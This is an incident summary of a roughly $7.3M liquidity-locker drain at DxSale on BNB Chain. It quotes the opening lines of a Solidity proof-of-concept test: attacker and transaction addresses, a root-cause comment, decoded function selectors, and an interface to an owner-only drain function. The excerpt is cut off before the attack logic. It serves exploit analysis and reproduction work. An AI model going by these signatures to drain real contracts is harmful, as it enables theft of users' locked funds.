# [?] DxSale - Ownership Override Attack

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DxSale
Published: 2026-05-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/DxSale_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~7.3M USD

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$7.3M USD
// Attacker : 0xC4574DDEF299e7E563971e200433e592EeaaFA69
// Attack Contract : 0x74ad1ef17fbb3e494c31c72f7ec730a27fef0310 (EIP-7702 delegated drainer)
// Vulnerable Contract : 0xEb3a9C56d963b971d320f889bE2fb8B59853e449 (DxSale Legacy Liquidity Locker)
// Attack Tx : 0xe211904a8a40f653acd64ffc33a42429ef571c1e2da16976d07ac0f9a0bcc9c1
// @Analysis
// Post-mortem : https://crypto.news/dxsale-exploit-drains-7-3m-in-bnb-through-hidden-contract-backdoor/
// Twitter Guy : https://x.com/Tahax1/status/1928169316736651568
// Hacking God : https://x.com/CoinsultAudits/status/1928203831996297670

// Root Cause:
// DxSale deployer secretly transferred locker ownership through 89 wallets over 269 days.
// Final owner (attacker) used privileged DXLOCKERLP() owner-only backdoor to drain
// all 1400+ locked LP positions without bypassing individual timelocks.
// Attack used EIP-7702 tx type 4 delegation to a custom drainer contract for batch execution.

// Function selectors decoded from unverified bytecode via 4byte.directory:
// 0xae4f4df1: DXLOCKERLP(address,uint256) -- owner-only backdoor drain function
// 0xc7450462: UserLockerCount(address)    -- returns number of locks for a user
// 0xdd2e0ac0: unlockToken(uint256)        -- normal user unlock (timelock enforced)
// 0x0511a506: createLocker(address,uint256,uint256,string) payable -- lock tokens
// 0x6cda375b: changeFees(uint256)         -- owner fee update

interface IDxSaleLocker {
    function DXLOCKERLP(address victim, uint256 lockId) external;
    function UserLockerCount(address user) external view returns (uint256);
}

contract DxSaleExploitTest is Test {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/DxSale_exp.sol_
